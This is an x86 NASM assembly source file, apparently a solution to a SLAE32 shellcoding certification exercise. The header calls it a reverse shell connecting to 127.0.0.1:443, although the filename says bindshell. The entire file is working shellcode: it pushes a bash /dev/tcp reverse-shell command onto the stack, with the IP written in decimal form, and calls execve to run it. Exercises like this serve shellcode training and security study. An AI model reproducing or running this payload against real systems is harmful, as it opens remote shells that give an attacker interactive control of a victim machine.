;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Filename : bindshell.nasm                         ;
; Author   : Jean-Pierre LESUEUR                    ;
; Website  : https://www.phrozen.io/                ;
; Email    : jplesueur@phrozen.io                   ;
; Twitter  : @DarkCoderSc                           ;
;                                                   ;
; --------------------------------------------------;
; SLAE32 Certification Exercise NÂ°2                 ;
; (Pentester Academy).                              ; 
; https://www.pentesteracademy.com                  ;
; --------------------------------------------------;
;                                                   ;
; Purpose:                                          ;
; --------------------------------------------------;
; Reverse Shell                                     ;
; Connects to 127.0.0.1:443 by default              ;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

global _start

section .text
_start:
	xor eax, eax	

	;--------------------------------------------------------------------
	; *pathname
	;--------------------------------------------------------------------

	; ///bin//bash
	push eax
	push 0x68736162 ; hsab
	push 0x2f2f6e69 ; //ni
	push 0x622f2f2f ; b///
	mov ebx, esp
	
	;--------------------------------------------------------------------
	; *argv[]
	;--------------------------------------------------------------------	

	; -c
	mov ax, 0x632d
	push eax
	xor eax, eax
	mov edx, esp

	; /*/bash -i>&/dev/tcp/2130706433/443 0>&1
	push eax
	push 0x31263e30 ; 1&>0
	push 0x20333434 ;  344
	push 0x2f333334 ; /334
	push 0x36303730 ; 6070
	push 0x3331322f ; 312/
	push 0x7063742f ; pct/
	push 0x7665642f ; ved/
	push 0x263e692d ; &>i-
	push 0x20687361 ;  hsa
	push 0x622f2a2f ; b/*/	
	
	mov esi, esp

	push eax        ; EOF Arguments 	

	push esi        ; Argv[2] = "/bin//bash -i >& /dev/tcp/127.0.0.1/443 0>&1"

	push edx        ; Argv[1] = "-c"

	push ebx        ; Argv[0] = "/bin/bash"

	mov ecx, esp

	;--------------------------------------------------------------------
	; *envp[] - We don't care (NULL)
	;--------------------------------------------------------------------	
	push eax
	mov edx, esp

	;--------------------------------------------------------------------
	; execve() syscall
	;--------------------------------------------------------------------	
	mov al, 0xb     

	int 0x80
